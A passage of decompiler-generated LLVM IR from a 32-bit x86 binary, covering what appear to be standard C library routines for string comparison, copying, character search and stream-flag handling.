  %v2_8051917 = inttoptr i32 %v1_8051917 to i32*
  %v3_8051917 = load i32, i32* %v2_8051917, align 4
  %v2_805191a = sub i32 %v3_8051917, %v3_8051914
  %v3_805191f = inttoptr i32 %arg1 to i16*
  %v4_805191f = call i32 @function_8051818(i16* %v3_805191f, i32 %v3_8051914, i32 %v2_805191a)
  %v0_8051924 = load i32, i32* @ebx, align 4
  %v1_8051924 = add i32 %v0_8051924, 8
  %v2_8051924 = inttoptr i32 %v1_8051924 to i32*
  %v3_8051924 = load i32, i32* %v2_8051924, align 4
  store i32 %v3_8051924, i32* %edx.global-to-local, align 4
  %v2_8051927 = add i32 %v0_8051924, 16
  %v3_8051927 = inttoptr i32 %v2_8051927 to i32*
  store i32 %v3_8051924, i32* %v3_8051927, align 4
  %v0_805192a = load i32, i32* %edx.global-to-local, align 4
  %v2_805192a = add i32 %v0_805192a, %v4_805191f
  store i32 %v2_805192a, i32* %edx.global-to-local, align 4
  %v1_805192c = load i32, i32* @ebx, align 4
  %v2_805192c = add i32 %v1_805192c, 20
  %v3_805192c = inttoptr i32 %v2_805192c to i32*
  store i32 %v2_805192a, i32* %v3_805192c, align 4
  store i32 %v0_805190c, i32* @ebx, align 4
  ret i32 %v4_805191f

; uselistorder directives
  uselistorder i32 %v4_805191f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @function_8051934(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051934:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051934 = load i32, i32* @ebx, align 4
  %v4_8051938 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051938, i32* @ebx, align 4
  %v2_8051940 = load i16, i16* %arg1, align 2
  %v3_8051940 = zext i16 %v2_8051940 to i32
  %v2_8051943 = and i32 %v3_8051940, %arg2
  %v3_8051943 = icmp eq i32 %v2_8051943, 0
  %v1_8051945 = icmp eq i1 %v3_8051943, false
  br i1 %v1_8051945, label %dec_label_pc_8051953, label %dec_label_pc_8051947

dec_label_pc_8051947:                             ; preds = %dec_label_pc_8051934
  %v1_8051947 = and i32 %v3_8051940, 2176
  %v2_8051947 = icmp eq i32 %v1_8051947, 0
  %v1_805194c = icmp eq i1 %v2_8051947, false
  br i1 %v1_805194c, label %dec_label_pc_805195a, label %dec_label_pc_805194e

dec_label_pc_805194e:                             ; preds = %dec_label_pc_8051947
  %v2_805194e = or i32 %v3_8051940, %arg2
  %v1_8051950 = trunc i32 %v2_805194e to i16
  store i16 %v1_8051950, i16* %arg1, align 2
  %v0_8051953.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051953

dec_label_pc_8051953:                             ; preds = %dec_label_pc_8051934, %dec_label_pc_805194e
  %v0_8051979 = phi i32 [ %v4_8051938, %dec_label_pc_8051934 ], [ %v0_8051953.pre, %dec_label_pc_805194e ]
  %v1_8051953 = inttoptr i32 %v0_8051979 to i16*
  %v2_8051953 = load i16, i16* %v1_8051953, align 2
  %v2_8051956 = and i16 %v2_8051953, 16
  %v3_8051956 = icmp eq i16 %v2_8051956, 0
  br i1 %v3_8051956, label %dec_label_pc_8051972, label %dec_label_pc_805195a

dec_label_pc_805195a:                             ; preds = %dec_label_pc_8051953, %dec_label_pc_8051947
  %v1_805195a = call i32 @function_804baa4(i32 %v0_8051934)
  %v1_805195f = inttoptr i32 %v1_805195a to i32*
  store i32 9, i32* %v1_805195f, align 4
  br label %dec_label_pc_8051965

dec_label_pc_8051965:                             ; preds = %dec_label_pc_8051976, %dec_label_pc_805195a
  %v0_8051965 = load i32, i32* @ebx, align 4
  %v1_8051965 = inttoptr i32 %v0_8051965 to i32*
  %v2_8051965 = load i32, i32* %v1_8051965, align 4
  %v1_8051967 = or i32 %v2_8051965, 8
  %v1_805196a = trunc i32 %v1_8051967 to i16
  %v3_805196a = inttoptr i32 %v0_8051965 to i16*
  store i16 %v1_805196a, i16* %v3_805196a, align 2
  br label %dec_label_pc_805199e

dec_label_pc_8051972:                             ; preds = %dec_label_pc_8051953
  %v2_8051972 = and i16 %v2_8051953, 64
  %v3_8051972 = icmp eq i16 %v2_8051972, 0
  br i1 %v3_8051972, label %dec_label_pc_8051994, label %dec_label_pc_8051976

dec_label_pc_8051976:                             ; preds = %dec_label_pc_8051972
  %v2_805197a = call i32 @function_804c2c0(i32 %v0_8051979)
  %v1_8051982 = icmp eq i32 %v2_805197a, 0
  %v1_8051984 = icmp eq i1 %v1_8051982, false
  br i1 %v1_8051984, label %dec_label_pc_8051965, label %dec_label_pc_8051986

dec_label_pc_8051986:                             ; preds = %dec_label_pc_8051976
  %v0_8051986 = load i32, i32* @ebx, align 4
  %v1_8051986 = add i32 %v0_8051986, 8
  %v2_8051986 = inttoptr i32 %v1_8051986 to i32*
  %v3_8051986 = load i32, i32* %v2_8051986, align 4
  %v2_8051989 = add i32 %v0_8051986, 28
  %v3_8051989 = inttoptr i32 %v2_8051989 to i32*
  store i32 %v3_8051986, i32* %v3_8051989, align 4
  %v0_805198c = load i32, i32* @ebx, align 4
  %v1_805198c = inttoptr i32 %v0_805198c to i32*
  %v2_805198c = load i32, i32* %v1_805198c, align 4
  %v2_805198c.tr = trunc i32 %v2_805198c to i16
  %v1_8051991 = and i16 %v2_805198c.tr, -65
  %v3_8051991 = inttoptr i32 %v0_805198c to i16*
  store i16 %v1_8051991, i16* %v3_8051991, align 2
  %v0_8051994.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051994

dec_label_pc_8051994:                             ; preds = %dec_label_pc_8051972, %dec_label_pc_8051986
  %v2_8051999 = phi i32 [ %v0_8051979, %dec_label_pc_8051972 ], [ %v0_8051994.pre, %dec_label_pc_8051986 ]
  %v1_8051994 = inttoptr i32 %v2_8051999 to i32*
  %v2_8051994 = load i32, i32* %v1_8051994, align 4
  %v1_8051996 = or i32 %v2_8051994, 1
  %v1_8051999 = trunc i32 %v1_8051996 to i16
  %v3_8051999 = inttoptr i32 %v2_8051999 to i16*
  store i16 %v1_8051999, i16* %v3_8051999, align 2
  br label %dec_label_pc_805199e

dec_label_pc_805199e:                             ; preds = %dec_label_pc_8051965, %dec_label_pc_8051994
  %storemerge = phi i32 [ 0, %dec_label_pc_8051994 ], [ -1, %dec_label_pc_8051965 ]
  %v2_805199e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805199e, i32* @edx, align 4
  store i32 %v0_8051934, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8051940, { 0, 2, 1 }
  uselistorder i32 %v0_8051934, { 1, 0 }
  uselistorder i32 (i32)* @function_804c2c0, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16 0, { 0, 7, 2, 1, 8, 5, 9, 6, 10, 11, 12, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805199e, { 1, 0 }
  uselistorder label %dec_label_pc_8051994, { 1, 0 }
  uselistorder label %dec_label_pc_8051953, { 1, 0 }
}

define i32 @function_80519a4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80519a4:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80519b0 = add i32 %tmp5, 4
  %v2_80519b0 = inttoptr i32 %v1_80519b0 to i32*
  %v3_80519b0 = load i32, i32* %v2_80519b0, align 4
  %v2_80519b3 = load i32, i32* %arg2, align 4
  %v1_80519b9 = add i32 %arg1, 4
  %v2_80519b9 = inttoptr i32 %v1_80519b9 to i32*
  %v3_80519b9 = load i32, i32* %v2_80519b9, align 4
  %v4_80519bc = call i32 @function_80525c4(i32 %v3_80519b9, i32 %v2_80519b3, i32 %v3_80519b0, i32 %arg3)
  %v0_80519c4 = load i32, i32* @edx, align 4
  %v2_80519c4 = icmp slt i32 %v0_80519c4, 0
  store i32 %v4_80519bc, i32* %ecx.global-to-local, align 4
  br i1 %v2_80519c4, label %dec_label_pc_80519d1, label %dec_label_pc_80519ca

dec_label_pc_80519ca:                             ; preds = %dec_label_pc_80519a4
  %v1_80519ca = load i32, i32* @ebx, align 4
  %v2_80519ca = inttoptr i32 %v1_80519ca to i32*
  store i32 %v4_80519bc, i32* %v2_80519ca, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_80519ce = load i32, i32* @edx, align 4
  %v1_80519ce = load i32, i32* @ebx, align 4
  %v2_80519ce = add i32 %v1_80519ce, 4
  %v3_80519ce = inttoptr i32 %v2_80519ce to i32*
  store i32 %v0_80519ce, i32* %v3_80519ce, align 4
  %v0_80519d2.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80519d1

dec_label_pc_80519d1:                             ; preds = %dec_label_pc_80519a4, %dec_label_pc_80519ca
  %v0_80519d2 = phi i32 [ %v4_80519bc, %dec_label_pc_80519a4 ], [ %v0_80519d2.pre, %dec_label_pc_80519ca ]
  ret i32 %v0_80519d2

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_80519d1, { 1, 0 }
}

define i32 @function_80519d8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80519d8:
  %v4_80519da = ptrtoint i8* %arg1 to i32
  %v4_80519e2.pre = load i32, i32* @eax, align 4
  %v8_80519e2.pre = load i1, i1* @df, align 1
  %v9_80519e2 = select i1 %v8_80519e2.pre, i32 -1, i32 1
  br label %dec_label_pc_80519e2

dec_label_pc_80519e2:                             ; preds = %dec_label_pc_80519e6, %dec_label_pc_80519d8
  %v20_80519e3 = phi i32 [ %v23_80519e3, %dec_label_pc_80519e6 ], [ %arg2, %dec_label_pc_80519d8 ]
  %v4_80519e2 = phi i32 [ %v6_80519e2, %dec_label_pc_80519e6 ], [ %v4_80519e2.pre, %dec_label_pc_80519d8 ]
  %v7_80519e2 = phi i32 [ %v10_80519e2, %dec_label_pc_80519e6 ], [ %v4_80519da, %dec_label_pc_80519d8 ]
  %v1_80519e2 = inttoptr i32 %v7_80519e2 to i8*
  %v2_80519e2 = load i8, i8* %v1_80519e2, align 1
  %v3_80519e3 = inttoptr i32 %v20_80519e3 to i8*
  %v4_80519e3 = load i8, i8* %v3_80519e3, align 1
  %v15_80519e3 = icmp eq i8 %v2_80519e2, %v4_80519e3
  %v1_80519e4 = icmp eq i1 %v15_80519e3, false
  br i1 %v1_80519e4, label %dec_label_pc_80519ee, label %dec_label_pc_80519e6

dec_label_pc_80519e6:                             ; preds = %dec_label_pc_80519e2
  %v3_80519e2 = zext i8 %v2_80519e2 to i32
  %v5_80519e2 = and i32 %v4_80519e2, -256
  %v6_80519e2 = or i32 %v3_80519e2, %v5_80519e2
  %v23_80519e3 = add i32 %v20_80519e3, %v9_80519e2
  %v10_80519e2 = add i32 %v7_80519e2, %v9_80519e2
  %v4_80519e6 = icmp eq i8 %v2_80519e2, 0
  %v1_80519e8 = icmp eq i1 %v4_80519e6, false
  br i1 %v1_80519e8, label %dec_label_pc_80519e2, label %dec_label_pc_80519f2

dec_label_pc_80519ee:                             ; preds = %dec_label_pc_80519e2
  br label %dec_label_pc_80519f2

dec_label_pc_80519f2:                             ; preds = %dec_label_pc_80519e6, %dec_label_pc_80519ee
  %storemerge = phi i32 [ 1, %dec_label_pc_80519ee ], [ 0, %dec_label_pc_80519e6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80519e2, { 1, 2, 0 }
  uselistorder i32 %v9_80519e2, { 1, 0 }
  uselistorder label %dec_label_pc_80519f2, { 1, 0 }
}

define i32 @function_80519f8() local_unnamed_addr {
dec_label_pc_80519f8:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80519fb = load i32, i32* @esi, align 4
  store i32 %v0_80519fb, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_80519ff = ptrtoint i8* %tmp5 to i32
  store i32 %v4_80519ff, i32* %esi.global-to-local, align 4
  %v4_8051a07 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8051a0b = call i32 @_strlen(i8* %v4_8051a07)
  %v2_8051a0d = add i32 %tmp, -1
  store i32 %v2_8051a0d, i32* %edi.global-to-local, align 4
  %v8_8051a1110 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051a1110, label %dec_label_pc_8051a1c, label %dec_label_pc_8051a14.lr.ph

dec_label_pc_8051a14.lr.ph:                       ; preds = %dec_label_pc_80519f8
  %v4_8051a14.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8051a14.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051a14

dec_label_pc_8051a14:                             ; preds = %dec_label_pc_8051a14.lr.ph, %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge
  %v8_8051a14 = phi i1 [ %v8_8051a14.pre, %dec_label_pc_8051a14.lr.ph ], [ %v5_8051a15, %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge ]
  %v4_8051a14 = phi i32 [ %v4_8051a14.pre, %dec_label_pc_8051a14.lr.ph ], [ %v0_8051a16, %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge ]
  %v2_8051a1e12 = phi i32 [ %v2_8051a0d, %dec_label_pc_8051a14.lr.ph ], [ %v7_8051a15, %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge ]
  %v0_8051a14 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a14 = inttoptr i32 %v0_8051a14 to i8*
  %v2_8051a14 = load i8, i8* %v1_8051a14, align 1
  %v3_8051a14 = zext i8 %v2_8051a14 to i32
  %v5_8051a14 = and i32 %v4_8051a14, -256
  %v6_8051a14 = or i32 %v5_8051a14, %v3_8051a14
  store i32 %v6_8051a14, i32* %eax.global-to-local, align 4
  %v9_8051a14 = select i1 %v8_8051a14, i32 -1, i32 1
  %v10_8051a14 = add i32 %v9_8051a14, %v0_8051a14
  store i32 %v10_8051a14, i32* %esi.global-to-local, align 4
  %v3_8051a15 = inttoptr i32 %v2_8051a1e12 to i8*
  store i8 %v2_8051a14, i8* %v3_8051a15, align 1
  %v4_8051a15 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051a15 = load i1, i1* @df, align 1
  %v6_8051a15 = select i1 %v5_8051a15, i32 -1, i32 1
  %v7_8051a15 = add i32 %v6_8051a15, %v4_8051a15
  store i32 %v7_8051a15, i32* %edi.global-to-local, align 4
  %v0_8051a16 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051a16 = trunc i32 %v0_8051a16 to i8
  %v4_8051a16 = icmp eq i8 %v3_8051a16, 0
  %v1_8051a18 = icmp eq i1 %v4_8051a16, false
  br i1 %v1_8051a18, label %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge, label %dec_label_pc_8051a1f

dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge: ; preds = %dec_label_pc_8051a14
  %v0_8051a11.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051a11 = add i32 %v0_8051a11.pre, -1
  %v8_8051a11 = icmp eq i32 %v1_8051a11, 0
  store i32 %v1_8051a11, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051a11, label %dec_label_pc_8051a1c, label %dec_label_pc_8051a14

dec_label_pc_8051a1c:                             ; preds = %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge, %dec_label_pc_80519f8
  %v2_8051a1e.lcssa = phi i32 [ %v2_8051a0d, %dec_label_pc_80519f8 ], [ %v7_8051a15, %dec_label_pc_8051a14.dec_label_pc_8051a11_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8051a1e = inttoptr i32 %v2_8051a1e.lcssa to i8*
  store i8 0, i8* %v3_8051a1e, align 1
  %v4_8051a1e = load i32, i32* %edi.global-to-local, align 4
  %v5_8051a1e = load i1, i1* @df, align 1
  %v6_8051a1e = select i1 %v5_8051a1e, i32 -1, i32 1
  %v7_8051a1e = add i32 %v6_8051a1e, %v4_8051a1e
  store i32 %v7_8051a1e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051a1f

dec_label_pc_8051a1f:                             ; preds = %dec_label_pc_8051a14, %dec_label_pc_8051a1c
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8051a23 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a23, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8051a11, { 1, 0 }
  uselistorder i32 %v0_8051a16, { 1, 0 }
  uselistorder i32 %v7_8051a15, { 0, 2, 1 }
  uselistorder i1 %v5_8051a15, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8051a1f, { 1, 0 }
  uselistorder label %dec_label_pc_8051a14, { 1, 0 }
}

define i32 @function_8051a28(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051a28:
  %v0_8051a29 = load i32, i32* @ebx, align 4
  %v4_8051a2a = urem i32 %arg2, 256
  %v4_8051a2e = ptrtoint i8* %arg1 to i32
  %v2_8051a393 = urem i32 %v4_8051a2e, 4
  %v3_8051a394 = icmp eq i32 %v2_8051a393, 0
  %v1_8051a3b8 = icmp eq i1 %v3_8051a394, false
  %v4_8051a34 = trunc i32 %arg2 to i8
  br i1 %v1_8051a3b8, label %dec_label_pc_8051a34, label %dec_label_pc_8051a3d

dec_label_pc_8051a34:                             ; preds = %dec_label_pc_8051a28, %dec_label_pc_8051a38
  %v0_8051a38 = phi i32 [ %v1_8051a38, %dec_label_pc_8051a38 ], [ %v4_8051a2e, %dec_label_pc_8051a28 ]
  %v1_8051a34 = inttoptr i32 %v0_8051a38 to i8*
  %v2_8051a34 = load i8, i8* %v1_8051a34, align 1
  %v15_8051a34 = icmp eq i8 %v2_8051a34, %v4_8051a34
  br i1 %v15_8051a34, label %dec_label_pc_8051a88, label %dec_label_pc_8051a38

dec_label_pc_8051a38:                             ; preds = %dec_label_pc_8051a34
  %v1_8051a38 = add i32 %v0_8051a38, 1
  %v2_8051a39 = urem i32 %v1_8051a38, 4
  %v3_8051a39 = icmp eq i32 %v2_8051a39, 0
  %v1_8051a3b = icmp eq i1 %v3_8051a39, false
  br i1 %v1_8051a3b, label %dec_label_pc_8051a34, label %dec_label_pc_8051a3d

dec_label_pc_8051a3d:                             ; preds = %dec_label_pc_8051a28, %dec_label_pc_8051a38
  %v0_8051a40 = phi i32 [ %v1_8051a38, %dec_label_pc_8051a38 ], [ %v4_8051a2e, %dec_label_pc_8051a28 ]
  %v2_8051a44 = mul nuw nsw i32 %v4_8051a2a, 256
  %v2_8051a47 = or i32 %v2_8051a44, %v4_8051a2a
  %v2_8051a4b = mul i32 %v2_8051a47, 65536
  %v2_8051a4e = or i32 %v2_8051a4b, %v2_8051a47
  br label %dec_label_pc_8051a50

dec_label_pc_8051a50:                             ; preds = %dec_label_pc_8051a80, %dec_label_pc_8051a50, %dec_label_pc_8051a3d
  %v0_8051a54 = phi i32 [ %v0_8051a40, %dec_label_pc_8051a3d ], [ %v1_8051a54, %dec_label_pc_8051a50 ], [ %v1_8051a54, %dec_label_pc_8051a80 ]
  %v2_8051a52 = inttoptr i32 %v0_8051a54 to i32*
  %v3_8051a52 = load i32, i32* %v2_8051a52, align 4
  %v4_8051a52 = xor i32 %v3_8051a52, %v2_8051a4e
  %v1_8051a54 = add i32 %v0_8051a54, 4
  %v1_8051a57 = add i32 %v4_8051a52, 2130640639
  %v1_8051a5d = sub i32 -1, %v4_8051a52
  %v2_8051a5f = xor i32 %v1_8051a57, %v1_8051a5d
  %v1_8051a61 = and i32 %v2_8051a5f, -2130640640
  %v2_8051a61 = icmp eq i32 %v1_8051a61, 0
  br i1 %v2_8051a61, label %dec_label_pc_8051a50, label %dec_label_pc_8051a68

dec_label_pc_8051a68:                             ; preds = %dec_label_pc_8051a50
  %v2_8051a68 = inttoptr i32 %v0_8051a54 to i8*
  %v3_8051a68 = load i8, i8* %v2_8051a68, align 1
  %v16_8051a68 = icmp eq i8 %v3_8051a68, %v4_8051a34
  br i1 %v16_8051a68, label %dec_label_pc_8051a88, label %dec_label_pc_8051a70

dec_label_pc_8051a70:                             ; preds = %dec_label_pc_8051a68
  %v1_8051a70 = add i32 %v0_8051a54, 1
  %v2_8051a70 = inttoptr i32 %v1_8051a70 to i8*
  %v3_8051a70 = load i8, i8* %v2_8051a70, align 1
  %v16_8051a70 = icmp eq i8 %v3_8051a70, %v4_8051a34
  br i1 %v16_8051a70, label %dec_label_pc_8051a88, label %dec_label_pc_8051a78

dec_label_pc_8051a78:                             ; preds = %dec_label_pc_8051a70
  %v1_8051a78 = add i32 %v0_8051a54, 2
  %v2_8051a78 = inttoptr i32 %v1_8051a78 to i8*
  %v3_8051a78 = load i8, i8* %v2_8051a78, align 1
  %v16_8051a78 = icmp eq i8 %v3_8051a78, %v4_8051a34
  br i1 %v16_8051a78, label %dec_label_pc_8051a88, label %dec_label_pc_8051a80

dec_label_pc_8051a80:                             ; preds = %dec_label_pc_8051a78
  %v1_8051a80 = add i32 %v0_8051a54, 3
  %v2_8051a80 = inttoptr i32 %v1_8051a80 to i8*
  %v3_8051a80 = load i8, i8* %v2_8051a80, align 1
  %v16_8051a80 = icmp eq i8 %v3_8051a80, %v4_8051a34
  %v1_8051a86 = icmp eq i1 %v16_8051a80, false
  br i1 %v1_8051a86, label %dec_label_pc_8051a50, label %dec_label_pc_8051a88

dec_label_pc_8051a88:                             ; preds = %dec_label_pc_8051a34, %dec_label_pc_8051a80, %dec_label_pc_8051a78, %dec_label_pc_8051a70, %dec_label_pc_8051a68
  %v0_8051a8a = phi i32 [ %v1_8051a80, %dec_label_pc_8051a80 ], [ %v1_8051a78, %dec_label_pc_8051a78 ], [ %v1_8051a70, %dec_label_pc_8051a70 ], [ %v0_8051a54, %dec_label_pc_8051a68 ], [ %v0_8051a38, %dec_label_pc_8051a34 ]
  store i32 %v0_8051a29, i32* @ebx, align 4
  ret i32 %v0_8051a8a

; uselistorder directives
  uselistorder i32 %v1_8051a54, { 1, 0 }
  uselistorder i32 %v2_8051a47, { 1, 0 }
  uselistorder i32 %v1_8051a38, { 1, 0, 2 }
  uselistorder i8 %v4_8051a34, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8051a2e, { 2, 1, 0 }
  uselistorder i32 %v4_8051a2a, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051a88, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8051a3d, { 1, 0 }
  uselistorder label %dec_label_pc_8051a34, { 1, 0 }
}

define i32 @function_8051a8c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051a8c:
  %v2_8051aae31 = load i8, i8* %arg1, align 1
  %v4_8051ab035 = icmp eq i8 %v2_8051aae31, 0
  br i1 %v4_8051ab035, label %dec_label_pc_8051ab8, label %dec_label_pc_8051ab4.lr.ph

dec_label_pc_8051ab4.lr.ph:                       ; preds = %dec_label_pc_8051a8c
  %v3_8051aae32 = zext i8 %v2_8051aae31 to i32
  %v4_8051aae.pre = load i32, i32* @eax, align 4
  %v5_8051aae33 = and i32 %v4_8051aae.pre, -256
  %v6_8051aae34 = or i32 %v3_8051aae32, %v5_8051aae33
  %v4_8051a95 = ptrtoint i8* %arg1 to i32
  %v1_8051aa018 = inttoptr i32 %arg2 to i8*
  %v4_8051aa0.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051ab4

dec_label_pc_8051a9b:                             ; preds = %dec_label_pc_8051ab4, %dec_label_pc_8051a9f
  %v6_8051aa028 = phi i32 [ %v6_8051aa0, %dec_label_pc_8051a9f ], [ %v6_8051aa022, %dec_label_pc_8051ab4 ]
  %v2_8051aa027 = phi i8 [ %v2_8051aa0, %dec_label_pc_8051a9f ], [ %v2_8051aa019, %dec_label_pc_8051ab4 ]
  %v0_8051a9f26 = phi i32 [ %v1_8051a9f, %dec_label_pc_8051a9f ], [ %arg2, %dec_label_pc_8051ab4 ]
  %v15_8051a9b = icmp eq i8 %v2_8051aae39, %v2_8051aa027
  br i1 %v15_8051a9b, label %dec_label_pc_8051aa8, label %dec_label_pc_8051a9f

dec_label_pc_8051a9f:                             ; preds = %dec_label_pc_8051a9b
  %v1_8051a9f = add i32 %v0_8051a9f26, 1
  store i32 %v1_8051a9f, i32* @edx, align 4
  %v1_8051aa0 = inttoptr i32 %v1_8051a9f to i8*
  %v2_8051aa0 = load i8, i8* %v1_8051aa0, align 1
  %v3_8051aa0 = zext i8 %v2_8051aa0 to i32
  %v5_8051aa0 = and i32 %v6_8051aa028, -256
  %v6_8051aa0 = or i32 %v3_8051aa0, %v5_8051aa0
  store i32 %v6_8051aa0, i32* @ecx, align 4
  %v4_8051aa2 = icmp eq i8 %v2_8051aa0, 0
  %v1_8051aa4 = icmp eq i1 %v4_8051aa2, false
  br i1 %v1_8051aa4, label %dec_label_pc_8051a9b, label %dec_label_pc_8051ab8

dec_label_pc_8051aa8:                             ; preds = %dec_label_pc_8051a9b
  %v1_8051aac = add i32 %v0_8051ab937, 1
  %v1_8051aad = add i32 %v0_8051aad38, 1
  %v1_8051aae = inttoptr i32 %v1_8051aad to i8*
  %v2_8051aae = load i8, i8* %v1_8051aae, align 1
  %v3_8051aae = zext i8 %v2_8051aae to i32
  %v5_8051aae = and i32 %v6_8051aae40, -256
  %v6_8051aae = or i32 %v3_8051aae, %v5_8051aae
  %v4_8051ab0 = icmp eq i8 %v2_8051aae, 0
  br i1 %v4_8051ab0, label %dec_label_pc_8051ab8, label %dec_label_pc_8051ab4

dec_label_pc_8051ab4:                             ; preds = %dec_label_pc_8051ab4.lr.ph, %dec_label_pc_8051aa8
  %v4_8051aa0.pre = phi i32 [ %v4_8051aa0.pre.pre, %dec_label_pc_8051ab4.lr.ph ], [ %v6_8051aa028, %dec_label_pc_8051aa8 ]
  %v6_8051aae40 = phi i32 [ %v6_8051aae34, %dec_label_pc_8051ab4.lr.ph ], [ %v6_8051aae, %dec_label_pc_8051aa8 ]
  %v2_8051aae39 = phi i8 [ %v2_8051aae31, %dec_label_pc_8051ab4.lr.ph ], [ %v2_8051aae, %dec_label_pc_8051aa8 ]
  %v0_8051aad38 = phi i32 [ %v4_8051a95, %dec_label_pc_8051ab4.lr.ph ], [ %v1_8051aad, %dec_label_pc_8051aa8 ]
  %v0_8051ab937 = phi i32 [ 0, %dec_label_pc_8051ab4.lr.ph ], [ %v1_8051aac, %dec_label_pc_8051aa8 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8051aa019 = load i8, i8* %v1_8051aa018, align 1
  %v3_8051aa020 = zext i8 %v2_8051aa019 to i32
  %v5_8051aa021 = and i32 %v4_8051aa0.pre, -256
  %v6_8051aa022 = or i32 %v3_8051aa020, %v5_8051aa021
  store i32 %v6_8051aa022, i32* @ecx, align 4
  %v4_8051aa223 = icmp eq i8 %v2_8051aa019, 0
  %v1_8051aa425 = icmp eq i1 %v4_8051aa223, false
  br i1 %v1_8051aa425, label %dec_label_pc_8051a9b, label %dec_label_pc_8051ab8

dec_label_pc_8051ab8:                             ; preds = %dec_label_pc_8051a8c, %dec_label_pc_8051aa8, %dec_label_pc_8051ab4, %dec_label_pc_8051a9f
  %v0_8051ab917 = phi i32 [ %v0_8051ab937, %dec_label_pc_8051a9f ], [ %v0_8051ab937, %dec_label_pc_8051ab4 ], [ 0, %dec_label_pc_8051a8c ], [ %v1_8051aac, %dec_label_pc_8051aa8 ]
  ret i32 %v0_8051ab917

; uselistorder directives
  uselistorder i32 %v6_8051aa022, { 1, 0 }
  uselistorder i8 %v2_8051aa019, { 1, 2, 0 }
  uselistorder i32 %v1_8051aad, { 1, 0 }
  uselistorder i32 %v6_8051aa0, { 1, 0 }
  uselistorder i8 %v2_8051aa0, { 1, 2, 0 }
  uselistorder i32 %v1_8051a9f, { 2, 1, 0 }
  uselistorder i8 %v2_8051aae31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ab8, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8051ab4, { 1, 0 }
}

define i32 @function_8051ac0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051ac0:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8051ac6 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8051ac9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ac9, i32* %stack_var_-16, align 4
  %v0_8051aca = load i32, i32* @eax, align 4
  store i32 %v0_8051aca, i32* %ebx.global-to-local, align 4
